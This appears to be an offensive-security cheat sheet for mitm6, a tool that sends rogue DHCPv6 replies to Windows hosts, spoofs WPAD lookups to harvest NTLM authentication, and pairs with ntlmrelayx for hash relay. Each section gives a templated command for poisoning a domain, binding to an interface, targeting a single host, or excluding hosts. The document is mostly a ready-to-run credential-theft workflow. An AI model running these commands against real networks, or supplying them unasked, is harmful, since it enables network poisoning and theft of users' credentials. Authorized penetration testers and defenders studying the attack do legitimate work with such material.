# Mitm6

IPv6 DHCP poisoner. Sends rogue DHCPv6 replies that make Windows hosts use the attacker as their IPv6 DNS server, then spoofs WPAD lookups to harvest NTLM auth. Pair with `ntlmrelayx -6` to relay the resulting hashes.

### Domain poison

Enumerate domain poison with Mitm6.

Start mitm6 on the domain - replies to DHCPv6 from any host in `$domain`'s DNS suffix.

```sh title:"Mitm6 Enumerate Domain Poison"
mitm6 -d $domain
```
<!-- cheat
import domain_ip
-->

### Specific interface

Run specific interface with Mitm6.

Bind to a specific interface when you have multiple network namespaces (tap, tun0, eth1, etc.).

```sh title:"Mitm6 Run Specific Interface"
mitm6 -d $domain -i $iface
```
<!-- cheat
import domain_ip
var iface
-->

### Target single host

Enumerate target single host with Mitm6.

Restrict spoofing to a specific FQDN - useful when you want to coerce only one machine and avoid flooding the network.

```sh title:"Mitm6 Enumerate Target Single Host"
mitm6 -d $domain --host-allowlist $target_fqdn
```
<!-- cheat
import domain_ip
var target_fqdn
-->

### Ignore a host

Run ignore a host with Mitm6.

Whitelist mode - poison everyone except specified hosts. Use when DCs/critical hosts should not be touched.

```sh title:"Mitm6 Run Ignore a Host"
mitm6 -d $domain --host-blocklist $skip_fqdn
```
<!-- cheat
import domain_ip
var skip_fqdn
-->
